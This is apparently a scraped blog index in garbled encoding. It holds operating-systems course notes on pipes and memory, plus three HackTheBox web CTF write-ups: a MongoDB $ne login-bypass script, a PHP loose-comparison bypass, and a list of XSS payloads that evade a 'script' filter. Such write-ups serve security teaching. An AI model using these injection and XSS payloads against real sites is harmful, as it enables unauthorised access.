ï¼ˆåŒ¿åï¼‰ç®¡é“ pipe() å‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œå®ƒè¿”å›ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ†åˆ«ç”¨äºè¯»å’Œå†™ã€‚ å¯ä»¥åœ¨ fork() åˆ›å»ºå­è¿›ç¨‹æ—¶ï¼ŒæŠŠå…¶ä¸­ä¸€ç«¯äº¤ç»™å­è¿›ç¨‹ï¼Œå®ç°è¿›ç¨‹é—´é€šä¿¡ï¼Œæˆ–è€…åœ¨ä¸åŒçš„çº¿ç¨‹ä¹‹é—´ä½¿ç”¨ã€‚ å‘½åç®¡é“ï¼ˆNamed Pipesï¼‰ ç”¨äºå¤šä¸ªè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ï¼Œå®ƒä»¬æœ‰è‡ªå·±çš„åå­—ï¼Œåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­å¯è§ã€‚ ä»£ç ç¤ºä¾‹ï¼š 123456789int main() &#123; int p[2]; // p[0]: è¯»ç«¯, p[1]: å†™ç«¯ pipe(p); // åˆ›å»ºä¸€ä¸ªåŒ¿åç®¡é“ sendData(p[1]); // å†™æ•°æ®åˆ°ç®¡é“ receiveData(p[0]); // ä»ç®¡é“ä¸­è¯»å–æ•°æ® return 0;&#125; 1234567891011void sendData(int fd) &#123; const char *msg = &quot;Hello, world&quot;; // è¦å‘é€çš„æ¶ˆæ¯ uint16_t len = strlen(msg); // æ¶ˆæ¯é•¿åº¦ï¼ˆä¸å« \\0ï¼‰ uint16_t nLen = htons(len); // è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åºï¼ˆå¤§ç«¯ï¼‰ // å…ˆå‘é€é•¿åº¦ï¼Œç¡®ä¿æ¥æ”¶ç«¯çŸ¥é“åé¢è¦è¯»å–å¤šå°‘å­—èŠ‚ send(fd, &amp;nLen, sizeof(nLen), 0); // å†å‘é€æ¶ˆæ¯æœ¬ä½“ send(fd, msg, len, 0);&#125; 123456789101112131415void receiveData(int fd) &#123; char msg[1024]; // æ¥æ”¶ç¼“å†²åŒº uint16_t nLen; // ç½‘ç»œå­—èŠ‚åºé•¿åº¦ uint16_t len; // ä¸»æœºå­—èŠ‚åºé•¿åº¦ // å…ˆæ¥æ”¶é•¿åº¦ä¿¡æ¯ï¼ˆ2å­—èŠ‚ï¼‰ recv(fd, &amp;nLen, sizeof(nLen), 0); len = ntohs(nLen); // è½¬æ¢ä¸ºä¸»æœºå­—èŠ‚åº // æ¥æ”¶å®é™…æ¶ˆæ¯å†…å®¹ï¼ˆlen å­—èŠ‚ï¼‰ recv(fd, msg, len, 0); msg[len] = &#x27;\\0&#x27;; // æ‰‹åŠ¨åŠ ä¸Šå­—ç¬¦ä¸²ç»“æŸç¬¦ printf(&quot;æ¥æ”¶åˆ° %u å­—èŠ‚ï¼š%s\\n&quot;, len, msg);&#125; ä¾‹é¢˜ä¾‹é¢˜1FÃ¼r wehlche der folgenden IPC-Mechanismen wird in der Regel ein Filedescriptor verwendent? Sockets Shared Memory Anon. Pipes Named Pipes Signals ç­”æ¡ˆï¼š1ï¼Œ3ï¼Œ4ã€‚","categories":[{"name":"TUM info è¯¾ç¨‹ç¬”è®°","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS æ“ä½œç³»ç»Ÿ","slug":"TUM-info-è¯¾ç¨‹ç¬”è®°/GBS-æ“ä½œç³»ç»Ÿ","permalink":"https://archer-baiyi.github.io/categories/TUM-info-%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"synchron","slug":"synchron","permalink":"https://archer-baiyi.github.io/tags/synchron/"},{"name":"asynchron","slug":"asynchron","permalink":"https://archer-baiyi.github.io/tags/asynchron/"},{"name":"signal","slug":"signal","permalink":"https://archer-baiyi.github.io/tags/signal/"}]},{"title":"HTB CandyVault Writeup","slug":"CTF/Web/HTB-CandyVault-Writeup","date":"2025-04-03T10:49:04.000Z","updated":"2025-04-03T10:57:36.233Z","comments":true,"path":"2025/04/03/CTF/Web/HTB-CandyVault-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/HTB-CandyVault-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæœ‰é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š æŸ¥çœ‹æºä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from flask import Flask, Blueprint, render_template, redirect, jsonify, requestfrom flask_bcrypt import Bcryptfrom pymongo import MongoClientapp = Flask(__name__)app.config.from_object(&quot;application.config.Config&quot;)bcrypt = Bcrypt(app)client = MongoClient(app.config[&quot;MONGO_URI&quot;])db = client[app.config[&quot;DB_NAME&quot;]]users_collection = db[&quot;users&quot;]@app.errorhandler(Exception)def handle_error(error): message = error.description if hasattr(error, &quot;description&quot;) else [str(x) for x in error.args] response = &#123; &quot;error&quot;: &#123; &quot;type&quot;: error.__class__.__name__, &quot;message&quot;: message &#125; &#125; return response, error.code if hasattr(error, &quot;code&quot;) else 500@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])def login(): content_type = request.headers.get(&quot;Content-Type&quot;) if content_type == &quot;application/x-www-form-urlencoded&quot;: email = request.form.get(&quot;email&quot;) password = request.form.get(&quot;password&quot;) elif content_type == &quot;application/json&quot;: data = request.get_json() email = data.get(&quot;email&quot;) password = data.get(&quot;password&quot;) else: return jsonify(&#123;&quot;error&quot;: &quot;Unsupported Content-Type&quot;&#125;), 400 user = users_collection.find_one(&#123;&quot;email&quot;: email, &quot;password&quot;: password&#125;) if user: return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read()) else: return redirect(&quot;/&quot;) å‘ç°ä½¿ç”¨äº†MongoDBè¿›è¡ŒéªŒè¯ï¼š 1234user = users_collection.find_one(&#123;&quot;email&quot;: email, &quot;password&quot;: password&#125;) if user: return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read()) å¦‚æœåœ¨æ•°æ®åº“é‡Œæ‰¾åˆ°äº†å¯¹åº”çš„ç”¨æˆ·ä¿¡æ¯åˆ™ç™»é™†æˆåŠŸè¿”å›flagã€‚ æ¸—é€åˆ©ç”¨MongoDBçš„æ¼æ´è¿›è¡Œæ³¨å…¥ã€‚æˆ‘ä»¬å‘é€ä»¥ä¸‹å†…å®¹ï¼š 123456789101112131415import requestsurl = &quot;http://94.237.53.247:51317/login&quot;payload = &#123; &quot;email&quot;: &#123;&quot;$ne&quot;: None&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: None&#125;&#125;response = requests.post(url, json=payload)print(&quot;Response Body:\\n&quot;, response.text)# &lt;body&gt;# &lt;p data-text=&quot;HTB&#123;s4y_h1_t0_th3_c4andy_v4u1t!&#125;&quot;&gt;HTB&#123;s4y_h1_t0_th3_c4andy_v4u1t!&#125;&lt;/p&gt;# &lt;/body&gt; è¿™æ ·ä¸€æ¥MongoDBé‡Œçš„æŸ¥è¯¢ä¼šè¢«è§£é‡Šæˆï¼š 1&#123;&quot;email&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125; ä¹Ÿå°±æ˜¯è¯´ä¼šæŸ¥æ‰¾ email ä¸ä¸º null ä¸” password ä¸ä¸º null çš„ä»»æ„ç”¨æˆ·ã€‚è¿™æ ·ä¾¿å¯ä»¥ç»•è¿‡ç™»å½•éªŒè¯ã€‚ å¾—åˆ°flagï¼šHTB{s4y_h1_t0_th3_c4andy_v4u1t!} ã€‚ ä¹Ÿå¯ä»¥å‘é€ï¼š 1234payload = &#123; &quot;email&quot;: &#123;&quot;$ne&quot;: 0&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: 0&#125;&#125; æ˜¯ä¸€æ ·çš„ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"MongoDB","slug":"MongoDB","permalink":"https://archer-baiyi.github.io/tags/MongoDB/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"HTB Juggling facts Writeup","slug":"CTF/Web/HTB-Juggling-facts-Writeup","date":"2025-04-02T22:46:14.000Z","updated":"2025-04-02T23:05:45.552Z","comments":true,"path":"2025/04/03/CTF/Web/HTB-Juggling-facts-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/HTB-Juggling-facts-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæœ‰é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š ç‚¹å‡» secret factsï¼š flagå¤§æ¦‚ç‡å’Œè¿™ä¸ªâ€œsecretsâ€æœ‰å…³ç³»ï¼Œä½†å…¶ä»–æ²¡æœ‰ä»€ä¹ˆå‘ç°æ‰€ä»¥å»çœ‹çœ‹æºä»£ç ã€‚åœ¨ index.php é‡Œ 123456789101112131415161718&lt;?php spl_autoload_register(function ($name) &#123; if (preg_match(&#x27;/Controller$/&#x27;, $name)) &#123; $name = &quot;controllers/$&#123;name&#125;&quot;; &#125; elseif (preg_match(&#x27;/Model$/&#x27;, $name)) &#123; $name = &quot;models/$&#123;name&#125;&quot;; &#125; include_once &quot;$&#123;name&#125;.php&quot;;&#125;);$database = new Database(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;M@k3l@R!d3s$&#x27;, &#x27;web_juggling_facts&#x27;);$database-&gt;connect();$router = new Router();$router-&gt;new(&#x27;GET&#x27;, &#x27;/&#x27;, &#x27;IndexController@index&#x27;);$router-&gt;new(&#x27;POST&#x27;,&#x27;/api/getfacts&#x27;, &#x27;IndexController@getfacts&#x27;);die($router-&gt;match()); å¯ä»¥å‘ç°ç½‘é¡µå®šä¹‰äº†2ä¸ªæ“ä½œï¼šgetå’Œpostã€‚2è€…éƒ½è°ƒç”¨äº† IndexController ï¼Œæ‰€ä»¥æˆ‘ä»¬é¡ºç€è¿™ä¸ªçº¿ç´¢å»çœ‹ä¸€ä¸‹ IndexController.phpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpclass IndexController extends Controller&#123; public function __construct() &#123; parent::__construct(); &#125; public function index($router) &#123; $router-&gt;view(&#x27;index&#x27;); &#125; public function getfacts($router) &#123; $jsondata = json_decode(file_get_contents(&#x27;php://input&#x27;), true); if ( empty($jsondata) || !array_key_exists(&#x27;type&#x27;, $jsondata)) &#123; return $router-&gt;jsonify([&#x27;message&#x27; =&gt; &#x27;Insufficient parameters!&#x27;]); &#125; if ($jsondata[&#x27;type&#x27;] === &#x27;secrets&#x27; &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) &#123; return $router-&gt;jsonify([&#x27;message&#x27; =&gt; &#x27;Currently this type can be only accessed through localhost!&#x27;]); &#125; switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;secrets&#x27;) ]); case &#x27;spooky&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;spooky&#x27;) ]); case &#x27;not_spooky&#x27;: return $router-&gt;jsonify([ &#x27;facts&#x27; =&gt; $this-&gt;facts-&gt;get_facts(&#x27;not_spooky&#x27;) ]); default: return $router-&gt;jsonify([ &#x27;message&#x27; =&gt; &#x27;Invalid type!&#x27; ]); &#125; &#125;&#125; ç¨å¾®æ‹†è§£åˆ†æä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬å‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼Œé‚£ä¹ˆå®ƒ é¦–å…ˆä¼šæ£€æŸ¥è¯·æ±‚å‚æ•°æ˜¯å¦å­˜åœ¨ï¼š 1if ( empty($jsondata) || !array_key_exists(&#x27;type&#x27;, $jsondata) ) åˆ¤æ–­ type ç±»å‹ï¼Œå¦‚æœæ˜¯secretsé‚£ä¹ˆæ£€æŸ¥æ˜¯å¦æ˜¯æœ¬åœ° IP 1if ($jsondata[&#x27;type&#x27;] === &#x27;secrets&#x27; &amp;&amp; $_SERVER[&#x27;REMOTE_ADDR&#x27;] !== &#x27;127.0.0.1&#x27;) æ¯”è¾ƒtypeçš„å€¼å¹¶è¿›è¡Œåç»­æ“ä½œï¼š 12345switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: case &#x27;spooky&#x27;: case &#x27;not_spooky&#x27;:&#125; æ¸—é€æ¼æ´æ­£æ˜¯è¿™ä¸ªæµç¨‹é‡Œçš„ switch() å‡½æ•°ã€‚phpé‡Œçš„è¿™ä¸ªæ¯”è¾ƒå‡½æ•°æ˜¯å®½æ¾æ¯”è¾ƒï¼ˆloose comparisonï¼‰ï¼ˆä¸¥æ ¼çš„è¯æ˜¯===ï¼‰ï¼Œä¼šæ ¹æ®æƒ…å†µè‡ªåŠ¨è½¬æ¢ç±»å‹ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨trueç»•è¿‡ï¼š 1234567891011121314151617181920&lt;?php$jsondata = [ &#x27;type&#x27; =&gt; true];switch ($jsondata[&#x27;type&#x27;]) &#123; case &#x27;secrets&#x27;: echo &quot;true == secrets\\n&quot;; break; case &#x27;spooky&#x27;: echo &quot;Failed\\n&quot;; break; case &#x27;not_spooky&#x27;: echo &quot;Failed\\n&quot;; break; default: echo &quot;Failed\\n&quot;; break;&#125; ä¼šè¿”å›ï¼š 1true == secrets æ‰€ä»¥æˆ‘ä»¬ç›´æ¥å‘é€ï¼š 123456789101112131415import requestsurl = &#x27;http://94.237.63.28:34695/api/getfacts&#x27;data = &#123; &quot;type&quot;: True&#125;resp = requests.post(url, json=data) print(&quot;Response:&quot;)print(resp.text)# è¿”å›ï¼š# Response:# &#123;&quot;facts&quot;:[&#123;&quot;id&quot;:19,&quot;fact&quot;:&quot;HTB&#123;juggl1ng_1s_d4ng3r0u5!!!&#125;&quot;,&quot;fact_type&quot;:&quot;secrets&quot;&#125;]&#125; å°±å¯ä»¥å¾—åˆ°flagï¼šHTB{juggl1ng_1s_d4ng3r0u5!!!} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"switch","slug":"switch","permalink":"https://archer-baiyi.github.io/tags/switch/"}]},{"title":"HTB SpookTastic Writeup","slug":"CTF/Web/HTB-SpookTastic-Writeup","date":"2025-04-02T21:56:21.000Z","updated":"2025-04-02T22:21:36.823Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-SpookTastic-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-SpookTastic-Writeup/","excerpt":"","text":"é¢˜ç›®æè¿° ï¼ˆæœ‰é™„ä»¶ï¼‰ è§‚å¯Ÿæ‰“å¼€ç½‘é¡µï¼š ç¿»åˆ°æœ€åº•ä¸‹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªè¾“å…¥æ¡†ï¼š é˜…è¯»ä¸€ä¸‹æºä»£ç ï¼ˆapp.pyï¼‰ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116import random, stringfrom flask import Flask, request, render_template, abortfrom flask_socketio import SocketIOfrom threading import Threadapp = Flask(__name__)socketio = SocketIO(app)registered_emails, socket_clients = [], &#123;&#125;generate = lambda x: &quot;&quot;.join([random.choice(string.hexdigits) for _ in range(x)])BOT_TOKEN = generate(16)def blacklist_pass(email): email = email.lower() if &quot;script&quot; in email: return False return Truedef send_flag(user_ip): for id, ip in socket_clients.items(): if ip == user_ip: socketio.emit(&quot;flag&quot;, &#123;&quot;flag&quot;: open(&quot;flag.txt&quot;).read()&#125;, room=id)def start_bot(user_ip): from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.chrome.service import Service from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC host, port = &quot;localhost&quot;, 1337 HOST = f&quot;http://&#123;host&#125;:&#123;port&#125;&quot; options = Options() options.add_argument(&quot;--headless&quot;) options.add_argument(&quot;--no-sandbox&quot;) options.add_argument(&quot;--disable-dev-shm-usage&quot;) options.add_argument(&quot;--disable-infobars&quot;) options.add_argument(&quot;--disable-background-networking&quot;) options.add_argument(&quot;--disable-default-apps&quot;) options.add_argument(&quot;--disable-extensions&quot;) options.add_argument(&quot;--disable-gpu&quot;) options.add_argument(&quot;--disable-sync&quot;) options.add_argument(&quot;--disable-translate&quot;) options.add_argument(&quot;--hide-scrollbars&quot;) options.add_argument(&quot;--metrics-recording-only&quot;) options.add_argument(&quot;--mute-audio&quot;) options.add_argument(&quot;--no-first-run&quot;) options.add_argument(&quot;--dns-prefetch-disable&quot;) options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;) options.add_argument(&quot;--media-cache-size=1&quot;) options.add_argument(&quot;--disk-cache-size=1&quot;) options.add_argument(&quot;--user-agent=HTB/1.0&quot;) service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;) browser = webdriver.Chrome(service=service, options=options) try: browser.get(f&quot;&#123;HOST&#125;/bot?token=&#123;BOT_TOKEN&#125;&quot;) WebDriverWait(browser, 3).until(EC.alert_is_present()) alert = browser.switch_to.alert alert.accept() send_flag(user_ip) except Exception as e: pass finally: registered_emails.clear() browser.quit()@app.route(&quot;/&quot;)def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/api/register&quot;, methods=[&quot;POST&quot;])def register(): if not request.is_json or not request.json[&quot;email&quot;]: return abort(400) if not blacklist_pass(request.json[&quot;email&quot;]): return abort(401) registered_emails.append(request.json[&quot;email&quot;]) Thread(target=start_bot, args=(request.remote_addr,)).start() return &#123;&quot;success&quot;:True&#125;@app.route(&quot;/bot&quot;)def bot(): if request.args.get(&quot;token&quot;, &quot;&quot;) != BOT_TOKEN: return abort(404) return render_template(&quot;bot.html&quot;, emails=registered_emails)@socketio.on(&quot;connect&quot;)def on_connect(): socket_clients[request.sid] = request.remote_addr@socketio.on(&quot;disconnect&quot;)def on_disconnect(): del socket_clients[request.sid]if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False) ä¸éš¾å‘ç°2ç‚¹ï¼š è¿™é‡Œ 1return render_template(&quot;bot.html&quot;, emails=registered_emails) ä¼šæ¥æ”¶æˆ‘ä»¬çš„è¾“å…¥å¹¶ä¸”ç›´æ¥æ’å…¥ bot.html é‡Œï¼Œè€ŒæŸ¥çœ‹ bot.html ï¼š 123&#123;% for email in emails %&#125; &lt;span&gt;&#123;&#123; email|safe &#125;&#125;&lt;/span&gt;&lt;br/&gt;&#123;% endfor %&#125; ä¼šå‘ç°å®ƒä¼šç›´æ¥å°†æˆ‘ä»¬çš„è¾“å…¥ä¸è¿›è¡Œè¿‡æ»¤ç›´æ¥æ’å…¥è¿›æ¨¡æ¿é‡Œï¼Œæ‰€ä»¥æ³¨å…¥æ˜¯å¯è¡Œçš„ã€‚ å”¯ä¸€çš„ä¸€ç‚¹å°é˜»æ‹¦æ˜¯è¿™é‡Œï¼š 1234567def blacklist_pass(email): email = email.lower() if &quot;script&quot; in email: return False return True æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¸èƒ½åŒ…å«â€scriptâ€ã€‚ é€šè¿‡è¿™æ®µï¼š 12345678try: browser.get(f&quot;&#123;HOST&#125;/bot?token=&#123;BOT_TOKEN&#125;&quot;) WebDriverWait(browser, 3).until(EC.alert_is_present()) alert = browser.switch_to.alert alert.accept() send_flag(user_ip) å¯ä»¥ç¡®å®šåªè¦æˆ‘ä»¬å¯ä»¥æˆåŠŸè§¦å‘alertå°±å¯ä»¥å¾—åˆ°flagã€‚ æ¸—é€æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯ä¸æ„é€ åŒ…å«â€scriptâ€çš„æ³¨å…¥è§¦å‘alertï¼Œæ–¹æ³•æœ‰å¾ˆå¤šç§ï¼ˆæ¯ä¸€è¡Œéƒ½æ˜¯å¯è¡Œçš„ï¼‰ï¼š 1234567891011121314151617181920212223242526272829&lt;img src=x onerror=alert(1)&gt;&lt;img src=x onerror=&amp;#x61;lert(1)&gt;&lt;img src=1 onerror=confirm(1)&gt;&lt;img src=a onerror=prompt(1)&gt;&lt;svg onload=alert(1)&gt;&lt;svg onload=&amp;#97;lert(1)&gt;&lt;svg oNlOaD=alert(1)&gt;&lt;svg/onload=alert(1)&gt;&lt;svg onload=/*x*/alert(1)&gt;&lt;img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&gt;&lt;svg onload=prompt(1)&gt;&lt;svg&gt;&lt;animate attributeName=x dur=1s onend=alert(1)&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&lt;iframe onload=alert(1)&gt;&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&gt;&quot;&gt;&lt;/iframe&gt;&lt;details open ontoggle=alert(1)&gt;X&lt;/details&gt;&lt;math&gt;&lt;mtext&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/mtext&gt;&lt;/math&gt;&lt;/span&gt;&lt;svg onload=alert(1)&gt;&lt;/span&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/span&gt;&lt;iframe onload=alert(1)&gt;&lt;/span&gt;&lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt; ç‚¹å‡»åå°±ä¼šæ˜¾ç¤ºï¼š å¾—åˆ°flagï¼šHTB{al3rt5_c4n_4nd_w1l1_c4us3_jumpsc4r35!!} ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"},{"name":"html","slug":"html","permalink":"https://archer-baiyi.github.io/tags/html/"}]},{"title":"GBS 6 Speicherverwaltung å†…å­˜ç®¡ç†","slug":"TUM info ç¬”è®°/GBS/GBS-6-Speicherverwaltung-å†…å­˜ç®¡ç†","date":"2025-04-02T20:20:04.000Z","updated":"2025-04-26T18:31:05.713Z","comments":true,"path":"2025/04/02/TUM info ç¬”è®°/GBS/GBS-6-Speicherverwaltung-å†…å­˜ç®¡ç†/","permalink":"https://archer-baiyi.github.io/2025/04/02/TUM%20info%20%E7%AC%94%E8%AE%B0/GBS/GBS-6-Speicherverwaltung-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/","excerpt":"æ“ä½œç³»ç»ŸåŸºç¡€ç›¸å…³ç¬”è®°","text":"EinfÃ¼hrungé¦–å…ˆæ¥çœ‹ä¸€ä¸‹è®¡ç®—æœºå­˜å‚¨çš„å±‚æ¬¡ç»“æ„ï¼š ä»ä¸Šå¾€ä¸‹ä¾æ¬¡æ˜¯å¯„å­˜å™¨ã€ç¼“å­˜ã€å†…å­˜ã€ç¡¬ç›˜ä»¥åŠç£å¸¦é©±åŠ¨å™¨ã€‚å­˜å‚¨ç©ºé—´å¤§å°ï¼ˆä»ä¸Šå¾€ä¸‹ï¼‰ä¾æ¬¡é€’å¢ï¼Œä½†è¯»å–é€Ÿåº¦ä¾æ¬¡é€’å‡ã€‚ æˆ‘ä»¬è¿™ç« ä¸»è¦å…³æ³¨å†…å­˜ï¼ˆHauptspeicherï¼‰ã€‚ ç‰©ç†å†…å­˜ç®¡ç†å‡å¦‚æ‰€æœ‰ç¨‹åºå¯ä»¥å®Œå…¨è®¿é—®æ•´ä¸ªç‰©ç†å†…å­˜ï¼Œé‚£ä¹ˆæ¯ä¸ªç¨‹åºéƒ½æœ‰å¯èƒ½å ç”¨æ•´ä¸ªä¸»å†…å­˜ï¼Œç”šè‡³å¯èƒ½è¦†ç›–æ‰ç³»ç»Ÿå†…å­˜åŒºåŸŸï¼Œå¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚åŒ…æ‹¬ç¨‹åºç›´æ¥ä¹Ÿå¯èƒ½ä¼šç›¸äº’å¹²æ‰°ã€‚æ‰€ä»¥æˆ‘ä»¬å¸Œæœ›ç»™æ¯ä¸ªè¿›ç¨‹åˆ†é…ç‹¬ç«‹çš„å­˜å‚¨ç©ºé—´ã€‚ å¯»å€ï¼ˆAdressierungï¼‰è€Œä¸ºäº†æ›´å¥½åœ°ç®¡ç†ç‰©ç†åœ°å€ç©ºé—´ï¼ˆPhysischer Adressraumï¼‰ï¼Œæˆ‘ä»¬ä¼šä»ä¸­æŠ½è±¡å‡ºé€»è¾‘åœ°å€ç©ºé—´ï¼ˆLogischer Adressraumï¼‰ï¼Œç„¶åé€šè¿‡å†…å­˜æ˜ å°„ï¼ˆSpeicherabbildungï¼ŒMemory Address Translationï¼‰å°†é€»è¾‘åœ°å€è½¬æ¢æˆå®é™…çš„ç‰©ç†åœ°å€ã€‚è¿™ç§å†…å­˜æ˜ å°„ä¹Ÿå«åšå¯»å€ï¼ˆAdressierungï¼‰ã€‚ å¯»å€æ–¹å¼ä¸€èˆ¬æœ‰3ç§ï¼š ç›´æ¥å¯»å€ï¼ˆDirekte Adressierungï¼‰è¿™ç§å¯»å€çš„æ˜ å°„ç›¸å½“äºæ˜¯ $f = id$ ã€‚å›¾ç¤ºï¼š ä½†ä¸€æ—¦æœ‰å¤šä¸ªç¨‹åºè¿è¡Œçš„è¯ï¼Œæˆ‘ä»¬ä¼šç¢°åˆ°ä»¥ä¸‹é—®é¢˜ï¼š å¤§é‡äº¤æ¢ï¼ˆExtensives Swappingï¼‰ åœ¨æŸä¸€æ—¶åˆ»ä¸€å®šæ˜¯åªæœ‰ä¸€ä¸ªç¨‹åºåœ¨è¿è¡Œå¹¶ä¸”ä½¿ç”¨å†…å­˜ç©ºé—´ï¼Œæ‰€ä»¥å½“æ“ä½œç³»ç»Ÿæƒ³è¦åˆ‡æ¢è¿è¡Œçš„ç¨‹åºæ—¶ï¼Œéœ€è¦æŠŠå½“å‰è¿è¡Œç¨‹åºçš„å†…å­˜å†…å®¹ä¿å­˜åˆ°ç¡¬ç›˜ï¼Œç„¶åä»ç¡¬ç›˜åŠ è½½ä¸‹ä¸€ä¸ªç¨‹åºåˆ°å†…å­˜ä¸­ã€‚ è¿™æ ·ä¼šå¯¼è‡´æ•ˆç‡æå…¶ä½ä¸‹ï¼ˆæˆ–è€…è¯´éå¸¸æ…¢ï¼‰ã€‚ é‡å®šä½ï¼ˆRelokationï¼‰ ç”±äºç¨‹åºå¯ä»¥è¢«åŠ è½½åˆ°å†…å­˜çš„ä¸åŒä½ç½®ï¼Œæ‰€ä»¥æ¯æ¬¡é‡æ–°åˆ†é…åœ°å€æ—¶éœ€è¦æ”¹å†™ï¼ˆé‡å®šä½ï¼‰æ‰€æœ‰çš„åœ°å€ï¼Œä¼šéå¸¸çš„éº»çƒ¦ã€‚ï¼ˆå¯ä»¥çœ‹ä¸‹é¢ä¸¾çš„ä¾‹å­ï¼‰ åŸºå€å¯»å€ï¼ˆBasis-Adressierungï¼‰æ¯ä¸€ä¸ªè¿›ç¨‹ä¼šå¾—åˆ°ä¸€ä¸ªåŸºå€ï¼ˆBasisadresseï¼‰$b_x$ ï¼Œè¿™ä¸ªè¿›ç¨‹çš„æ‰€æœ‰åœ°å€éƒ½æ˜¯åŸºäºè¿™ä¸ªåŸºå€çš„ä¸€ä¸ªç›¸å¯¹åœ°å€ã€‚ å›¾ç¤ºï¼š 